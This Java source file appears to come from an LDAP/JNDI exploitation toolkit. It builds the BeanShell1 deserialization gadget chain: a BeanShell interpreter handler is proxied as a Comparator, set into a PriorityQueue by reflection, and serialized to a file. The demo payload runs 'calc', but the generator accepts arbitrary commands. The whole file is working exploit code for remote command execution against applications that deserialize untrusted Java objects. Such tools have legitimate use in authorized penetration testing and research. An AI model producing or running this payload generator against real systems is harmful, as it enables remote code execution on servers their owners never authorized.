package com.feihong.ldap.gadgets;

import bsh.Interpreter;
import bsh.XThis;
import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Reflections;
import com.feihong.ldap.gadgets.utils.beanshell.BeanShellUtil;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;

public class BeanShell1 {
    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("6666.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        String      command = String.valueOf(type);
        String      payload = BeanShellUtil.makeBeanShellPayload(command);
        Interpreter i       = new Interpreter();
        i.eval(payload);
        XThis             xt      = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
        Comparator<? super Object> comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
        PriorityQueue<Object>      priorityQueue = new PriorityQueue(2, comparator);
        Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(priorityQueue);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
